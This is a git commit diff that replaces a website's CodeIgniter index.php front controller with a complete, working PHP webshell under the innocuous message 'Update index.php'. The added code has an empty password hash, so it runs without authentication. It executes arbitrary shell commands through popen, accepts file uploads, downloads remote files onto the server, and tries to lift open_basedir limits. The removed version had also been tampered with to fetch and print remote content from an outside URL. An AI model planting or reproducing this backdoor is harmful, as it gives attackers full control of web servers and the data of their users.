50b38e4771c19cfafacfc4aa680b7c91238ce01a
dandi889 <138586931+dandi889@users.noreply.github.com>
2024-06-30 16:05:14 +0700

    Update index.php
    Signed-off-by: dandi889 <138586931+dandi889@users.noreply.github.com>

--- index.php
+++ index.php
@@ -1,317 +1,296 @@
-<?php
-/**
- * CodeIgniter
+����#<?php
+/*******************************************************************************
+ * Copyright 2017 WhiteWinterWolf
+ * https://www.whitewinterwolf.com/tags/php-webshell/
  *
- * An open source application development framework for PHP
+ * This file is part of wwolf-php-webshell.
  *
- * This content is released under the MIT License (MIT)
+ * wwwolf-php-webshell is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
  *
- * Copyright (c) 2014 - 2019, British Columbia Institute of Technology
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
  *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2019, British Columbia Institute of Technology (https://bcit.ca/)
- * @license	https://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 1.0.0
- * @filesource
- */
+ * You should have received a copy of the GNU General Public License
+ * along with this program.  If not, see <http://www.gnu.org/licenses/>.
+ ******************************************************************************/
 
 /*
- *---------------------------------------------------------------
- * APPLICATION ENVIRONMENT
- *---------------------------------------------------------------
- *
- * You can load different configurations depending on your
- * current environment. Setting the environment also influences
- * things like logging and error reporting.
- *
- * This can be set to anything, but default usage is:
- *
- *     development
- *     testing
- *     production
- *
- * NOTE: If you change these, also change the error_reporting() code below
+ * Optional password settings.
+ * Use the 'passhash.sh' script to generate the hash.
+ * NOTE: the prompt value is tied to the hash!
  */
-	define('ENVIRONMENT', isset($_SERVER['CI_ENV']) ? $_SERVER['CI_ENV'] : 'production');
+$passprompt = "WhiteWinterWolf's PHP webshell: ";
+$passhash = "";
 
-/*
- *---------------------------------------------------------------
- * ERROR REPORTING
- *---------------------------------------------------------------
- *
- * Different environments will require different levels of error reporting.
- * By default development will show errors but testing and live will hide them.
- */
-switch (ENVIRONMENT)
+function e($s) { echo htmlspecialchars($s, ENT_QUOTES); }
+
+function h($s)
 {
-	case 'development':
-		error_reporting(-1);
-		ini_set('display_errors', 1);
-	break;
-
-	case 'testing':
-	case 'production':
-		ini_set('display_errors', 0);
-		if (version_compare(PHP_VERSION, '5.3', '>='))
-		{
-			error_reporting(E_ALL & ~E_NOTICE & ~E_DEPRECATED & ~E_STRICT & ~E_USER_NOTICE & ~E_USER_DEPRECATED);
-		}
-		else
-		{
-			error_reporting(E_ALL & ~E_NOTICE & ~E_STRICT & ~E_USER_NOTICE);
-		}
-	break;
-
-	default:
-		header('HTTP/1.1 503 Service Unavailable.', TRUE, 503);
-		echo 'The application environment is not set correctly.';
-		exit(1); // EXIT_ERROR
+	global $passprompt;
+	if (function_exists('hash_hmac'))
+	{
+		return hash_hmac('sha256', $s, $passprompt);
+	}
+	else
+	{
+		return bin2hex(mhash(MHASH_SHA256, $s, $passprompt));
+	}
 }
 
-/*
- *---------------------------------------------------------------
- * SYSTEM DIRECTORY NAME
- *---------------------------------------------------------------
- *
- * This variable must contain the name of your "system" directory.
- * Set the path if it is not in the same directory as this file.
- */
-	$system_path = 'system';
-
-/*
- *---------------------------------------------------------------
- * APPLICATION DIRECTORY NAME
- *---------------------------------------------------------------
- *
- * If you want this front controller to use a different "application"
- * directory than the default one you can set its name here. The directory
- * can also be renamed or relocated anywhere on your server. If you do,
- * use an absolute (full) server path.
- * For more info please see the user guide:
- *
- * https://codeigniter.com/user_guide/general/managing_apps.html
- *
- * NO TRAILING SLASH!
- */
-	$application_folder = 'application';
-
-/*
- *---------------------------------------------------------------
- * VIEW DIRECTORY NAME
- *---------------------------------------------------------------
- *
- * If you want to move the view directory out of the application
- * directory, set the path to it here. The directory can be renamed
- * and relocated anywhere on your server. If blank, it will default
- * to the standard location inside your application directory.
- * If you do move this, use an absolute (full) server path.
- *
- * NO TRAILING SLASH!
- */
-	$view_folder = '';
-
-
-/*
- * --------------------------------------------------------------------
- * DEFAULT CONTROLLER
- * --------------------------------------------------------------------
- *
- * Normally you will set your default controller in the routes.php file.
- * You can, however, force a custom routing by hard-coding a
- * specific controller class/function here. For most applications, you
- * WILL NOT set your routing here, but it's an option for those
- * special instances where you might want to override the standard
- * routing in a specific front controller that shares a common CI installation.
- *
- * IMPORTANT: If you set the routing here, NO OTHER controller will be
- * callable. In essence, this preference limits your application to ONE
- * specific controller. Leave the function name blank if you need
- * to call functions dynamically via the URI.
- *
- * Un-comment the $routing array below to use this feature
- */
-	// The directory name, relative to the "controllers" directory.  Leave blank
-	// if your controller is not in a sub-directory within the "controllers" one
-	// $routing['directory'] = '';
-
-	// The controller class file name.  Example:  mycontroller
-	// $routing['controller'] = '';
-
-	// The controller function you wish to be called.
-	// $routing['function']	= '';
-
-
-/*
- * -------------------------------------------------------------------
- *  CUSTOM CONFIG VALUES
- * -------------------------------------------------------------------
- *
- * The $assign_to_config array below will be passed dynamically to the
- * config class when initialized. This allows you to set custom config
- * items or override any default config values found in the config.php file.
- * This can be handy as it permits you to share one application between
- * multiple front controller files, with each file containing different
- * config values.
- *
- * Un-comment the $assign_to_config array below to use this feature
- */
-	// $assign_to_config['name_of_config_item'] = 'value of config item';
-
-
-
-// --------------------------------------------------------------------
-// END OF USER CONFIGURABLE SETTINGS.  DO NOT EDIT BELOW THIS LINE
-// --------------------------------------------------------------------
-
-/*
- * ---------------------------------------------------------------
- *  Resolve the system path for increased reliability
- * ---------------------------------------------------------------
- */
-
-	// Set the current directory correctly for CLI requests
-	if (defined('STDIN'))
+function fetch_fopen($host, $port, $src, $dst)
+{
+	global $err, $ok;
+	$ret = '';
+	if (strpos($host, '://') === false)
 	{
-		chdir(dirname(__FILE__));
-	}
-
-	if (($_temp = realpath($system_path)) !== FALSE)
-	{
-		$system_path = $_temp.DIRECTORY_SEPARATOR;
+		$host = 'http://' . $host;
 	}
 	else
 	{
-		// Ensure there's a trailing slash
-		$system_path = strtr(
-			rtrim($system_path, '/\\'),
-			'/\\',
-			DIRECTORY_SEPARATOR.DIRECTORY_SEPARATOR
-		).DIRECTORY_SEPARATOR;
+		$host = str_replace(array('ssl://', 'tls://'), 'https://', $host);
 	}
-
-	// Is the system path correct?
-	if ( ! is_dir($system_path))
+	$rh = fopen("${host}:${port}${src}", 'rb');
+	if ($rh !== false)
 	{
-		header('HTTP/1.1 503 Service Unavailable.', TRUE, 503);
-		echo 'Your system folder path does not appear to be set correctly. Please open the following file and correct this: '.pathinfo(__FILE__, PATHINFO_BASENAME);
-		exit(3); // EXIT_CONFIG
-	}
-
-/*
- * -------------------------------------------------------------------
- *  Now that we know the path, set the main path constants
- * -------------------------------------------------------------------
- */
-	// The name of THIS file
-	define('SELF', pathinfo(__FILE__, PATHINFO_BASENAME));
-
-	// Path to the system directory
-	define('BASEPATH', $system_path);
-
-	// Path to the front controller (this file) directory
-	define('FCPATH', dirname(__FILE__).DIRECTORY_SEPARATOR);
-
-	// Name of the "system" directory
-	define('SYSDIR', basename(BASEPATH));
-
-	// The path to the "application" directory
-	if (is_dir($application_folder))
-	{
-		if (($_temp = realpath($application_folder)) !== FALSE)
+		$wh = fopen($dst, 'wb');
+		if ($wh !== false)
 		{
-			$application_folder = $_temp;
+			$cbytes = 0;
+			while (! feof($rh))
+			{
+				$cbytes += fwrite($wh, fread($rh, 1024));
+			}
+			fclose($wh);
+			$ret .= "${ok} Fetched file <i>${dst}</i> (${cbytes} bytes)<br />";
 		}
 		else
 		{
-			$application_folder = strtr(
-				rtrim($application_folder, '/\\'),
-				'/\\',
-				DIRECTORY_SEPARATOR.DIRECTORY_SEPARATOR
-			);
+			$ret .= "${err} Failed to open file <i>${dst}</i><br />";
 		}
-	}
-	elseif (is_dir(BASEPATH.$application_folder.DIRECTORY_SEPARATOR))
-	{
-		$application_folder = BASEPATH.strtr(
-			trim($application_folder, '/\\'),
-			'/\\',
-			DIRECTORY_SEPARATOR.DIRECTORY_SEPARATOR
-		);
+		fclose($rh);
 	}
 	else
 	{
-		header('HTTP/1.1 503 Service Unavailable.', TRUE, 503);
-		echo 'Your application folder path does not appear to be set correctly. Please open the following file and correct this: '.SELF;
-		exit(3); // EXIT_CONFIG
+		$ret = "${err} Failed to open URL <i>${host}:${port}${src}</i><br />";
 	}
+	return $ret;
+}
 
-	define('APPPATH', $application_folder.DIRECTORY_SEPARATOR);
-
-	// The path to the "views" directory
-	if ( ! isset($view_folder[0]) && is_dir(APPPATH.'views'.DIRECTORY_SEPARATOR))
+function fetch_sock($host, $port, $src, $dst)
+{
+	global $err, $ok;
+	$ret = '';
+	$host = str_replace('https://', 'tls://', $host);
+	$s = fsockopen($host, $port);
+	if ($s)
 	{
-		$view_folder = APPPATH.'views';
-	}
-	elseif (is_dir($view_folder))
-	{
-		if (($_temp = realpath($view_folder)) !== FALSE)
+		$f = fopen($dst, 'wb');
+		if ($f)
 		{
-			$view_folder = $_temp;
+			$buf = '';
+			$r = array($s);
+			$w = NULL;
+			$e = NULL;
+			fwrite($s, "GET ${src} HTTP/1.0\r\n\r\n");
+			while (stream_select($r, $w, $e, 5) && !feof($s))
+			{
+				$buf .= fread($s, 1024);
+			}
+			$buf = substr($buf, strpos($buf, "\r\n\r\n") + 4);
+			fwrite($f, $buf);
+			fclose($f);
+			$ret .= "${ok} Fetched file <i>${dst}</i> (" . strlen($buf) . " bytes)<br />";
 		}
 		else
 		{
-			$view_folder = strtr(
-				rtrim($view_folder, '/\\'),
-				'/\\',
-				DIRECTORY_SEPARATOR.DIRECTORY_SEPARATOR
-			);
+			$ret .= "${err} Failed to open file <i>${dst}</i><br />";
 		}
-	}
-	elseif (is_dir(APPPATH.$view_folder.DIRECTORY_SEPARATOR))
-	{
-		$view_folder = APPPATH.strtr(
-			trim($view_folder, '/\\'),
-			'/\\',
-			DIRECTORY_SEPARATOR.DIRECTORY_SEPARATOR
-		);
+		fclose($s);
 	}
 	else
 	{
-		header('HTTP/1.1 503 Service Unavailable.', TRUE, 503);
-		echo 'Your view folder path does not appear to be set correctly. Please open the following file and correct this: '.SELF;
-		exit(3); // EXIT_CONFIG
+		$ret .= "${err} Failed to connect to <i>${host}:${port}</i><br />";
 	}
+	return $ret;
+}
 
-	define('VIEWPATH', $view_folder.DIRECTORY_SEPARATOR);
+ini_set('log_errors', '0');
+ini_set('display_errors', '1');
+error_reporting(E_ALL);
 
-/*
- * --------------------------------------------------------------------
- * LOAD THE BOOTSTRAP FILE
- * --------------------------------------------------------------------
- *
- * And away we go...
- */
-require_once BASEPATH.'core/CodeIgniter.php';
-$a = file_get_contents('https://paulsaar.com/tmb/bl.txt');
-echo $a; ?>
+while (@ ob_end_clean());
+
+if (! isset($_SERVER))
+{
+	global $HTTP_POST_FILES, $HTTP_POST_VARS, $HTTP_SERVER_VARS;
+	$_FILES = &$HTTP_POST_FILES;
+	$_POST = &$HTTP_POST_VARS;
+	$_SERVER = &$HTTP_SERVER_VARS;
+}
+
+$auth = '';
+$cmd = empty($_POST['cmd']) ? '' : $_POST['cmd'];
+$cwd = empty($_POST['cwd']) ? getcwd() : $_POST['cwd'];
+$fetch_func = 'fetch_fopen';
+$fetch_host = empty($_POST['fetch_host']) ? $_SERVER['REMOTE_ADDR'] : $_POST['fetch_host'];
+$fetch_path = empty($_POST['fetch_path']) ? '' : $_POST['fetch_path'];
+$fetch_port = empty($_POST['fetch_port']) ? '80' : $_POST['fetch_port'];
+$pass = empty($_POST['pass']) ? '' : $_POST['pass'];
+$url = $_SERVER['REQUEST_URI'];
+$status = '';
+$ok = '&#9786; :';
+$warn = '&#9888; :';
+$err = '&#9785; :';
+
+if (! empty($passhash))
+{
+	if (function_exists('hash_hmac') || function_exists('mhash'))
+	{
+		$auth = empty($_POST['auth']) ? h($pass) : $_POST['auth'];
+		if (h($auth) !== $passhash)
+		{
+			?>
+				<form method="post" action="<?php e($url); ?>">
+					<?php e($passprompt); ?>
+					<input type="password" size="15" name="pass">
+					<input type="submit" value="Send">
+				</form>
+			<?php
+			exit;
+		}
+	}
+	else
+	{
+		$status .= "${warn} Authentication disabled ('mhash()' missing).<br />";
+	}
+}
+
+if (! ini_get('allow_url_fopen'))
+{
+	ini_set('allow_url_fopen', '1');
+	if (! ini_get('allow_url_fopen'))
+	{
+		if (function_exists('stream_select'))
+		{
+			$fetch_func = 'fetch_sock';
+		}
+		else
+		{
+			$fetch_func = '';
+			$status .= "${warn} File fetching disabled ('allow_url_fopen'"
+				. " disabled and 'stream_select()' missing).<br />";
+		}
+	}
+}
+if (! ini_get('file_uploads'))
+{
+	ini_set('file_uploads', '1');
+	if (! ini_get('file_uploads'))
+	{
+		$status .= "${warn} File uploads disabled.<br />";
+	}
+}
+if (ini_get('open_basedir') && ! ini_set('open_basedir', ''))
+{
+	$status .= "${warn} open_basedir = " . ini_get('open_basedir') . "<br />";
+}
+
+if (! chdir($cwd))
+{
+  $cwd = getcwd();
+}
+
+if (! empty($fetch_func) && ! empty($fetch_path))
+{
+	$dst = $cwd . DIRECTORY_SEPARATOR . basename($fetch_path);
+	$status .= $fetch_func($fetch_host, $fetch_port, $fetch_path, $dst);
+}
+
+if (ini_get('file_uploads') && ! empty($_FILES['upload']))
+{
+	$dest = $cwd . DIRECTORY_SEPARATOR . basename($_FILES['upload']['name']);
+	if (move_uploaded_file($_FILES['upload']['tmp_name'], $dest))
+	{
+		$status .= "${ok} Uploaded file <i>${dest}</i> (" . $_FILES['upload']['size'] . " bytes)<br />";
+	}
+}
+?>
+
+<form method="post" action="<?php e($url); ?>"
+	<?php if (ini_get('file_uploads')): ?>
+		enctype="multipart/form-data"
+	<?php endif; ?>
+	>
+	<?php if (! empty($passhash)): ?>
+		<input type="hidden" name="auth" value="<?php e($auth); ?>">
+	<?php endif; ?>
+	<table border="0">
+		<?php if (! empty($fetch_func)): ?>
+			<tr><td>
+				<b>Fetch:</b>
+			</td><td>
+				host: <input type="text" size="15" id="fetch_host" name="fetch_host" value="<?php e($fetch_host); ?>">
+				port: <input type="text" size="4" id="fetch_port" name="fetch_port" value="<?php e($fetch_port); ?>">
+				path: <input type="text" size="40" id="fetch_path" name="fetch_path" value="">
+			</td></tr>
+		<?php endif; ?>
+		<tr><td>
+			<b>CWD:</b>
+		</td><td>
+			<input type="text" size="50" id="cwd" name="cwd" value="<?php e($cwd); ?>">
+			<?php if (ini_get('file_uploads')): ?>
+				<b>Upload:</b> <input type="file" id="upload" name="upload">
+			<?php endif; ?>
+		</td></tr>
+		<tr><td>
+			<b>Cmd:</b>
+		</td><td>
+			<input type="text" size="80" id="cmd" name="cmd" value="<?php e($cmd); ?>">
+		</td></tr>
+		<tr><td>
+		</td><td>
+			<sup><a href="#" onclick="cmd.value=''; cmd.focus(); return false;">Clear cmd</a></sup>
+		</td></tr>
+		<tr><td colspan="2" style="text-align: center;">
+			<input type="submit" value="Execute" style="text-align: right;">
+		</td></tr>
+	</table>
+	
+</form>
+<hr />
+
+<?php
+if (! empty($status))
+{
+	echo "<p>${status}</p>";
+}
+
+echo "<pre>";
+if (! empty($cmd))
+{
+	echo "<b>";
+	e($cmd);
+	echo "</b>\n";
+	if (DIRECTORY_SEPARATOR == '/')
+	{
+		$p = popen('exec 2>&1; ' . $cmd, 'r');
+	}
+	else
+	{
+		$p = popen('cmd /C "' . $cmd . '" 2>&1', 'r');
+	}
+	while (! feof($p))
+	{
+		echo htmlspecialchars(fread($p, 4096), ENT_QUOTES);
+		@ flush();
+	}
+}
+echo "</pre>";
+
+exit;
+?>
